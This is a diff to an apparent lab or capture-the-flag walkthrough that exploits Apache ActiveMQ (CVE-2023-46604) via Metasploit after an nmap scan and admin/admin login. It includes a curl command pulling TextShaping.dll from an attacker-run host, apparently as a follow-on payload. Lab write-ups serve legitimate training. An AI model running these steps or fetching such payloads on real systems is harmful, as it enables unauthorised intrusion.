@@ -8,3 +8,23 @@ nmap -p- 192.168.2.8 -v -sC -sV -Pn
 admin/admin
 
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/f885f3e9-c4e7-4b48-9bb3-d56c39be9796)
+
+msf6
+
+multi/misc/apache_activemq_rce_cve_2023_46604
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/ab3f585e-50c7-4c02-8d33-abd7a511b7b3)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/12c6196c-cf44-4ba4-93fd-f9e5cc911e85)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/05f63ed2-0bda-459c-b3ec-7f0ecae15b9a)
+
+https://www.exploit-db.com/exploits/51267
+
+```
+curl -O http://192.168.100.IP:8000/TextShaping.dll
+```
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/2186c168-638f-43da-9d82-f159611a0753)
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/0dcc902b-1063-4e27-bc3d-b9f067f7be60)
